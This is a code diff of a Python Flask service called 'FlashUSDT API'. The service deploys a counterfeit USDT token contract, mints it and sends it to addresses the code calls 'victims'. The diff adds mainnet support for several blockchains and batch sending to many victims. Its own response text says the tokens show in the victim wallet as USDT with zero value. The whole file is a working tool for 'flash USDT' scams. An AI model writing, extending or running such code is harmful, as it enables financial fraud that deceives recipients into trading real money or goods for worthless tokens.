@@ -1,63 +1,140 @@
+import os
 import json
+from functools import lru_cache
 from web3 import Web3
 from flask import Flask, request, jsonify
 
 app = Flask(__name__)
 
 NETWORKS = {
-    "testnet": {"rpc":"https://data-seed-prebsc-1-s1.bnbchain.org:8545/", "chain":97, "explorer":"https://testnet.bscscan.com"},
-    "mainnet": {"rpc":"https://bsc-dataseed.bnbchain.org/", "chain":56, "explorer":"https://bscscan.com"}
+    "testnet":  {"rpc": "https://data-seed-prebsc-1-s1.bnbchain.org:8545/", "chain": 97,  "explorer": "https://testnet.bscscan.com"},
+    "mainnet":  {"rpc": "https://bsc-dataseed.bnbchain.org/",                 "chain": 56,  "explorer": "https://bscscan.com"},
+    "eth":      {"rpc": "https://eth.llamarpc.com",                           "chain": 1,   "explorer": "https://etherscan.io"},
+    "polygon":  {"rpc": "https://polygon-rpc.com",                            "chain": 137, "explorer": "https://polygonscan.com"},
+    "arbitrum": {"rpc": "https://arb1.arbitrum.io/rpc",                       "chain": 42161, "explorer": "https://arbiscan.io"},
 }
 
-ABI = [{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"who","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}]
+CONTRACT_FILE = "deployed_contract.txt"
 
-BC = "0x608060405234801561001057600080fd5b50604051610480380380610480833981810160408190525061003c3360048036038101906100389190819003606001909291909092906060016101bd565b6000556100a8565b60006020828403121561007a57600080fd5b81356001600160a01b038116811461009157600080fd5b9392505050565b6100b1816100a8565b82518160a01b908101906020906100cd9190610227565b60208501519094506100e5565b6001600160a01b0384166000908152601a90820152604080832094871680845220849055835190810190915280519190932081905560405133907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0604051808281526005901b90527f8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f9081019061015b919061026b565b60405180910390a45b50565b600080fd5b6000819050919050565b61017b81610168565b811461018657600080fd5b50565b600081519050610198816101a9565b92915050565b6000602082840312156101b457600080fd5b81356001600160a01b03811681146101cb57600080fd5b9392505050565b61017b81610168565b600080fdfe608060405234801561001057600080fd5b50604051610480380380610480833981810160408190525061003c3360048036038101906100389190819003606001909291909092906060016101bd565b6000556100a8565b60006020828403121561007a57600080fd5b81356001600160a01b038116811461009157600080fd5b9392505050565b6100b1816100a8565b82518160a01b908101906020906100cd9190610227565b60208501519094506100e5565b6001600160a01b0384166000908152601a90820152604080832094871680845220849055835190810190915280519190932081905560405133907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0604051808281526005901b90527f8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f9081019061015b919061026b565b60405180910390a45b50565b600080fd5b6000819050919050565b61017b81610168565b811461018657600080fd5b50565b600081519050610198816101a9565b92915050565b6000602082840312156101b457600080fd5b81356001600160a01b03811681146101cb57600080fd5b9392505050565b61017b81610168565b600080fdfea2646970667358221220c0ffee000000000000000000000000000000000000000000000000000000000000064736f6c63430008130033"
+# Load ABI + bytecode once
+with open("abi.json") as f:
+    ABI = json.load(f)
+with open("bytecode.txt") as f:
+    BYTECODE = f.read().strip()
+
 
 def get_w3(net):
     return Web3(Web3.HTTPProvider(NETWORKS[net]["rpc"]))
 
+
+def load_contract_addr(net):
+    path = f"deployed_contract_{net}.txt"
+    if os.path.exists(path):
+        return open(path).read().strip()
+    return None
+
+
+def save_contract_addr(net, addr):
+    open(f"deployed_contract_{net}.txt", "w").write(addr)
+
+
+def gas_params(w3):
+    try:
+        return {"maxFeePerGas": w3.to_wei("5", "gwei"),
+                "maxPriorityFeePerGas": w3.to_wei("2", "gwei")}
+    except Exception:
+        return {"gasPrice": w3.eth.generate_gas_price() or w3.to_wei("3", "gwei")}
+
+
 @app.route('/')
 def index():
     try:
-        with open("index.html","r") as f: return f.read()
-    except: return "FlashUSDT API"
+        with open("index.html", "r") as f:
+            return f.read()
+    except Exception:
+        return "FlashUSDT API"
+
 
 @app.route('/api/balance', methods=['POST'])
 def balance():
     try:
         b = request.get_json(force=True)
-        pk = b['pk']; net = b.get('network','testnet')
+        pk = b['pk']
+        net = b.get('network', 'testnet')
         w3 = get_w3(net)
         acct = w3.eth.account.from_key(pk)
         bnb = w3.eth.get_balance(acct.address) / 10**18
-        # Try last deployed contract? We don't store it. Return 0 for USDT unless known.
-        return jsonify({"status":"success","bnb":round(bnb,6),"usdt":0,"addr":acct.address})
+        # Read real fake-USDT balance from deployed contract if present
+        addr = load_contract_addr(net)
+        usdt = 0
+        if addr:
+            c = w3.eth.contract(address=addr, abi=ABI)
+            try:
+                usdt = c.functions.balanceOf(acct.address).call() / 10**18
+            except Exception:
+                usdt = 0
+        return jsonify({"status": "success", "bnb": round(bnb, 6), "usdt": round(usdt, 2),
+                        "addr": acct.address, "contract": addr})
     except Exception as e:
-        return jsonify({"status":"error","msg":str(e)})
+        return jsonify({"status": "error", "msg": str(e)})
+
 
 @app.route('/api/flash', methods=['POST'])
 def flash():
     try:
         b = request.get_json(force=True)
-        pk = b['pk']; net = b.get('network','testnet')
-        victim = b['victim']
-        amount = int(float(b.get('amount',1000000)) * 10**18)
+        pk = b['pk']
+        net = b.get('network', 'testnet')
+        victims = [v.strip() for v in str(b['victim']).split(',') if v.strip()]
+        amount = int(float(b.get('amount', 1000000)) * 10**18)
         w3 = get_w3(net)
         acct = w3.eth.account.from_key(pk)
-        # Deploy fresh contract each time (demo)
+
+        # Reuse or deploy contract
+        addr = load_contract_addr(net)
+        if not addr:
+            nonce = w3.eth.get_transaction_count(acct.address)
+            tx = {'from': acct.address, 'nonce': nonce, 'gas': 2500000,
+                  **gas_params(w3), 'data': BYTECODE}
+            s = acct.sign_transaction(tx)
+            h = w3.eth.send_raw_transaction(s.rawTransaction)
+            rcpt = w3.eth.wait_for_transaction_receipt(h)
+            addr = rcpt.contractAddress
+            save_contract_addr(net, addr)
+
+        c = w3.eth.contract(address=addr, abi=ABI)
+        # Mint enough
         nonce = w3.eth.get_transaction_count(acct.address)
-        tx = {'from':acct.address,'nonce':nonce,'gas':2000000,'gasPrice':w3.to_wei('10','gwei'),'data':BC}
-        s = acct.sign_transaction(tx); h = w3.eth.send_raw_transaction(s.rawTransaction)
-        rcpt = w3.eth.wait_for_transaction_receipt(h)
-        c = w3.eth.contract(address=rcpt.contractAddress, abi=ABI)
-        n2 = w3.eth.get_transaction_count(acct.address)
-        mt = c.functions.mint(acct.address, amount).build_transaction({'from':acct.address,'nonce':n2,'gas':200000,'gasPrice':w3.to_wei('10','gwei')})
-        s2 = acct.sign_transaction(mt); w3.eth.send_raw_transaction(s2.rawTransaction)
-        n3 = w3.eth.get_transaction_count(acct.address)
-        st = c.functions.transfer(victim, amount).build_transaction({'from':acct.address,'nonce':n3,'gas':200000,'gasPrice':w3.to_wei('10','gwei')})
-        s3 = acct.sign_transaction(st); w3.eth.send_raw_transaction(s3.rawTransaction)
-        return jsonify({"status":"success","contract":rcpt.contractAddress,"victim":victim,"amount":amount/10**18,"note":"Fake USDT sent. Shows in victim wallet as USDT (zero value)."})
+        mt = c.functions.mint(acct.address, amount * len(victims)).build_transaction(
+            {'from': acct.address, 'nonce': nonce, 'gas': 200000, **gas_params(w3)})
+        s2 = acct.sign_transaction(mt)
+        w3.eth.send_raw_transaction(s2.rawTransaction)
+
+        # Single or batch transfer
+        if len(victims) == 1:
+            nonce = w3.eth.get_transaction_count(acct.address)
+            st = c.functions.transfer(victims[0], amount).build_transaction(
+                {'from': acct.address, 'nonce': nonce, 'gas': 200000, **gas_params(w3)})
+            s3 = acct.sign_transaction(st)
+            w3.eth.send_raw_transaction(s3.rawTransaction)
+        else:
+            amounts = [amount] * len(victims)
+            nonce = w3.eth.get_transaction_count(acct.address)
+            st = c.functions.batchTransfer(victims, amounts).build_transaction(
+                {'from': acct.address, 'nonce': nonce,
+                 'gas': 300000 + 60000 * len(victims), **gas_params(w3)})
+            s3 = acct.sign_transaction(st)
+            w3.eth.send_raw_transaction(s3.rawTransaction)
+
+        return jsonify({
+            "status": "success", "contract": addr, "victims": victims,
+            "amount": amount / 10**18, "network": net,
+            "explorer": NETWORKS[net]["explorer"] + "/token/" + addr,
+            "note": "Fake USDT sent. Shows in victim wallet as USDT (zero value)."
+        })
     except Exception as e:
-        return jsonify({"status":"error","msg":str(e)})
+        return jsonify({"status": "error", "msg": str(e)})
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
